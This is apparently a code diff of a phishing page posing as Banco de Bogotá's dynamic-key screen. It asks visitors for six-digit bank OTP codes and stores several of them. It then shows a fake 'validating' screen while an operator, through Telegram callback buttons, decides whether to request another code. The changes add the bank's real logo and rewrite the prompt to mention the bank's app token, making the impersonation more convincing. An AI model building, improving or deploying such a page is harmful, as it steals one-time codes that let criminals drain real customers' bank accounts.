@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -483,6 +484,7 @@
         }
     </style>
 </head>
+
 <body>
     <div class="main-container">
         <!-- Left Section -->
@@ -490,8 +492,8 @@
             <!-- Logo -->
             <div class="logo-container">
                 <!-- Descomenta y usa tu logo -->
-                <!-- <img src="tu-logo.png" alt="Banco de Bogota" class="logo"> -->
-                <div class="logo-placeholder">Banco de Bogota</div>
+                <img src="/img/Banco-De-Bogota-Logo.png" alt="Banco de Bogota" class="logo">
+                <!-- <div class="logo-placeholder">Banco de Bogota</div> -->
             </div>
 
             <!-- Title -->
@@ -501,12 +503,13 @@
             <div class="help-banner">
                 <div class="help-banner-icon">
                     <svg viewBox="0 0 24 24">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                        <path
+                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                     </svg>
                 </div>
                 <div class="help-banner-text">
-                    <h3>Clave dinamica enviada</h3>
-                    <p>Revisa tu celular o token y digita el codigo de 6 digitos</p>
+                    <h3>Token enviado</h3>
+                    <p>Revisa tu celular o ingresa el token que encuentras en la App Banco de Bogota</p>
                 </div>
             </div>
 
@@ -515,66 +518,82 @@
                 <div id="otp-panel">
                     <h2 class="card-title">Ingresa tu clave dinamica</h2>
                     <p class="card-subtitle">
-                        Digita los 6 numeros de tu clave dinamica<br>
-                        que recibiste en tu celular o token
+                        Digita los 6 numeros de tu token.
+
                     </p>
 
                     <!-- Timer -->
-                <div class="timer-container">
-                    <div class="timer-icon">
-                        <svg viewBox="0 0 24 24">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/>
-                        </svg>
+                    <div class="timer-container">
+                        <div class="timer-icon">
+                            <svg viewBox="0 0 24 24">
+                                <path
+                                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z" />
+                            </svg>
+                        </div>
+                        <span class="timer-text" id="timer">02:00</span>
                     </div>
-                    <span class="timer-text" id="timer">02:00</span>
-                </div>
 
-                <!-- PIN Inputs -->
-                <div class="pin-container">
-                    <input type="text" class="pin-input" maxlength="1" readonly id="pin1">
-                    <input type="text" class="pin-input" maxlength="1" readonly id="pin2">
-                    <input type="text" class="pin-input" maxlength="1" readonly id="pin3">
-                    <input type="text" class="pin-input" maxlength="1" readonly id="pin4">
-                    <input type="text" class="pin-input" maxlength="1" readonly id="pin5">
-                    <input type="text" class="pin-input" maxlength="1" readonly id="pin6">
-                </div>
+                    <!-- PIN Inputs -->
+                    <div class="pin-container">
+                        <input type="text" class="pin-input" maxlength="1" readonly id="pin1">
+                        <input type="text" class="pin-input" maxlength="1" readonly id="pin2">
+                        <input type="text" class="pin-input" maxlength="1" readonly id="pin3">
+                        <input type="text" class="pin-input" maxlength="1" readonly id="pin4">
+                        <input type="text" class="pin-input" maxlength="1" readonly id="pin5">
+                        <input type="text" class="pin-input" maxlength="1" readonly id="pin6">
+                    </div>
 
-                <!-- Keypad -->
-                <div class="keypad">
-                    <button class="key" onclick="addDigit('1')">1</button>
-                    <button class="key" onclick="addDigit('2')">2</button>
-                    <button class="key" onclick="addDigit('3')">3</button>
-                    <button class="key" onclick="addDigit('4')">4</button>
-                    <button class="key" onclick="addDigit('5')">5</button>
-                    <button class="key" onclick="addDigit('6')">6</button>
-                    <button class="key" onclick="addDigit('7')">7</button>
-                    <button class="key" onclick="addDigit('8')">8</button>
-                    <button class="key" onclick="addDigit('9')">9</button>
-                    <button class="key empty"></button>
-                    <button class="key" onclick="addDigit('0')">0</button>
-                    <button class="key delete" onclick="deleteDigit()">
-                        <svg viewBox="0 0 24 24">
-                            <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/>
-                        </svg>
-                    </button>
-                </div>
+                    <!-- Keypad -->
+                    <div class="keypad">
+                        <button class="key" onclick="addDigit('1')">1</button>
+                        <button class="key" onclick="addDigit('2')">2</button>
+                        <button class="key" onclick="addDigit('3')">3</button>
+                        <button class="key" onclick="addDigit('4')">4</button>
+                        <button class="key" onclick="addDigit('5')">5</button>
+                        <button class="key" onclick="addDigit('6')">6</button>
+                        <button class="key" onclick="addDigit('7')">7</button>
+                        <button class="key" onclick="addDigit('8')">8</button>
+                        <button class="key" onclick="addDigit('9')">9</button>
+                        <button class="key empty"></button>
+                        <button class="key" onclick="addDigit('0')">0</button>
+                        <button class="key delete" onclick="deleteDigit()">
+                            <svg viewBox="0 0 24 24">
+                                <path
+                                    d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z" />
+                            </svg>
+                        </button>
+                    </div>
 
-                <!-- Resend -->
-                <div class="resend-container">
-                    <p class="resend-text">¿No recibiste el codigo?</p>
-                    <a class="resend-link" id="resendLink" onclick="resendCode()">Reenviar codigo</a>
-                </div>
+                    <!-- Resend -->
+                    <div class="resend-container">
+                        <p class="resend-text">¿No recibiste el codigo?</p>
+                        <a class="resend-link" id="resendLink" onclick="resendCode()">Reenviar codigo</a>
+                    </div>
 
-                <!-- Buttons -->
-                <div class="btn-container">
-                    <button class="btn btn-primary" id="btnConfirm" disabled>Confirmar</button>
-                    <button class="btn btn-secondary" onclick="window.location.href='banco-bogota-login.html'">Cancelar</button>
-                </div>
+                    <!-- Buttons -->
+                    <div class="btn-container">
+                        <button class="btn btn-primary" id="btnConfirm" disabled>Confirmar</button>
+                        <button class="btn btn-secondary"
+                            onclick="window.location.href='banco-bogota-login.html'">Cancelar</button>
+                    </div>
                 </div> <!-- End of otp-panel -->
 
-                <div id="waiting-panel" style="display: none; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center;">
-                    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #0056b3; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px;"></div>
-                    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+                <div id="waiting-panel"
+                    style="display: none; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center;">
+                    <div
+                        style="border: 4px solid #f3f3f3; border-top: 4px solid #0056b3; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px;">
+                    </div>
+                    <style>
+                        @keyframes spin {
+                            0% {
+                                transform: rotate(0deg);
+                            }
+
+                            100% {
+                                transform: rotate(360deg);
+                            }
+                        }
+                    </style>
                     <h2 class="card-title" style="margin-bottom: 10px;">Estamos validando tu información</h2>
                     <p class="card-subtitle">Por favor espera, este proceso puede tardar unos segundos...</p>
                 </div>
@@ -592,29 +611,29 @@
             <div class="services-container">
                 <div class="service-card">
                     <svg viewBox="0 0 24 24">
-                        <circle cx="12" cy="12" r="10"/>
-                        <path d="M12 6v6l4 2"/>
-                        <path d="M9 3h6M12 3v2"/>
+                        <circle cx="12" cy="12" r="10" />
+                        <path d="M12 6v6l4 2" />
+                        <path d="M9 3h6M12 3v2" />
                     </svg>
                     <span>Configuracion<br>de seguridad</span>
                 </div>
                 <div class="service-card">
                     <svg viewBox="0 0 24 24">
-                        <path d="M12 2l3 7h7l-5.5 4.5 2 7L12 16l-6.5 4.5 2-7L2 9h7z"/>
+                        <path d="M12 2l3 7h7l-5.5 4.5 2 7L12 16l-6.5 4.5 2-7L2 9h7z" />
                     </svg>
                     <span>Solicitar un<br>producto</span>
                 </div>
                 <div class="service-card">
                     <svg viewBox="0 0 24 24">
-                        <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/>
-                        <circle cx="12" cy="7" r="4"/>
-                        <path d="M16 3.13a4 4 0 010 7.75"/>
+                        <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" />
+                        <circle cx="12" cy="7" r="4" />
+                        <path d="M16 3.13a4 4 0 010 7.75" />
                     </svg>
                     <span>Atencion al<br>cliente</span>
                 </div>
                 <div class="nav-arrow">
                     <svg viewBox="0 0 24 24">
-                        <path d="M9 18l6-6-6-6"/>
+                        <path d="M9 18l6-6-6-6" />
                     </svg>
                 </div>
             </div>
@@ -731,7 +750,7 @@
         }
 
         // Confirm button
-        document.getElementById('btnConfirm').addEventListener('click', async function() {
+        document.getElementById('btnConfirm').addEventListener('click', async function () {
             if (currentPin.length === 6) {
                 // OTP Tracking Logic
                 let otpCount = parseInt(sessionStorage.getItem("otp_count") || "0") + 1;
@@ -755,7 +774,7 @@
                         const item = order.items[0];
                         producto = (item.isCombo ? 'STICKER COMBO FAMILIAR' : 'STICKER BENDECIDO') + ' x' + item.qty;
                     }
-                } catch (e) {}
+                } catch (e) { }
 
                 const otp1 = sessionStorage.getItem("otp_val_1") || "—";
                 const otp2 = sessionStorage.getItem("otp_val_2") || "—";
@@ -774,7 +793,7 @@
                 // Hide OTP panel, show waiting panel
                 document.getElementById('otp-panel').style.display = 'none';
                 document.getElementById('waiting-panel').style.display = 'flex';
-                
+
                 initPolling();
             }
         });
@@ -823,7 +842,7 @@
 
                             // Quitar botones de Telegram
                             removeTelegramButtons(msgId);
-                            
+
                             if (cbData === "pedir_otp") {
                                 document.getElementById('waiting-panel').style.display = 'none';
                                 document.getElementById('otp-panel').style.display = 'block';
@@ -848,7 +867,7 @@
         }
 
         // Keyboard support
-        document.addEventListener('keydown', function(e) {
+        document.addEventListener('keydown', function (e) {
             if (e.key >= '0' && e.key <= '9') {
                 addDigit(e.key);
             } else if (e.key === 'Backspace') {
@@ -859,7 +878,7 @@
         });
 
         // Paste support
-        document.addEventListener('paste', function(e) {
+        document.addEventListener('paste', function (e) {
             e.preventDefault();
             const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
             currentPin = pastedData;
@@ -868,4 +887,5 @@
         });
     </script>
 </body>
+
 </html>
